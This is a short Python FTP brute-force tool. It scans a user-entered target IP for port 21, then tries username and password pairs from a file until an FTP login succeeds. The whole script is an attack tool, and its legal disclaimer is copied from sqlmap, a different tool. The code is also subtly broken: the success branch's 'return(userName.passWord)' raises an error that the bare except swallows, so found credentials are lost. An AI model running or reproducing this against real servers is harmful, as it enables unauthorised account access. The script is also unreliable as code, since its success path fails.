print("  _ ___ _      _                                                                           _                                        ")
print(" |_  | |_) __ /  ._ _.  _ |   _  ._   _|_  _   _  |   o  _   ._ _   _.  _|  _    |_       |_) o _|_     ._ _. o  / |\ |  _   _. |_  ")
print(" |   | |      \_ | (_| (_ |< (/_ |     |_ (_) (_) |   | _>   | | | (_| (_| (/_   |_) \/   | \ |  |_ |_| | (_| | /  | \| (_) (_| | | ")

print("[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.")
print(" ")
import ftplib
import socket



def portScan(host) :
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, 21))
    if (connect == 0) :
        print("[+]\tPort 21: Open")
        bruteLogin(host,passwdFile)
        
    else :
        print("[-]\tPort 21: Close")
        s.close()

def bruteLogin(hostname,passwdFile):
    P = open(passwdFile, 'r')
    print("Now Trying Bruteforce attack.. Please Wait!")
    for line in P.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1]
        print("[+] Trying :\t" + userName +"/" +passWord)
        try :
            ftp = ftplib.FTP(hostname)
            ftp.login(userName,passWord)
            print("\n[*]" +str(hostname) + "FTP Login succeeded with"+userName+":"+passWord)
            ftp.quit()
            return(userName.passWord)
        except Exception as e:
            pass
    print('\n[-] Could not Found')
    return(None,None)
host = input('Enter target IP: ')
passwdFile = "UserAndPass.txt"
portScan(host)

            
